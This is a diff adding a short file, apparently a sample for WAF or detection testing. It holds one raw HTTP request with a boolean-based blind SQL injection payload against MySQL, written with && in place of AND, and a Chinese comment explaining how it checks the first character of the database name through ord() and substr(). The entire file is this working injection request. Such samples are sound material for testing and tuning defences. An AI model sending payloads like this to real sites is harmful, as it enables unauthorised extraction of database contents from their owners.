@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_布尔注入(&&代替and)
+# 基于布尔注入,攻击者尝试利用数据库函数substr()提取数据库名称的第一个字符，使用ord()函数获取该字符的ASCII值，并将其与119进行比较。如果数据库名称的第一个字符的ASCII值为119（'w'的ASCII值为119），则返回1；否则返回0。通过返回的结果，攻击者可以判断数据库名称的第一个字符，从而了解更多关于数据库的信息。该sql注入语句的目的是获取数据库名称的第一个字符，并进一步了解数据库结构和进行后续攻击行为。
+GET /?id=1%20&&%20if%28ord%28substr%28database%28%29%2C1%2C1%29%29=119%2C1%2C0%29&bid=hd_tag_m8mv26hw HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26hw
+RM-PRO-Token: 1c83b046097465ead3f637af102bc196
+RM-PRO-Time: 1742808619932
+User-Agent: curl/7.83.1
+
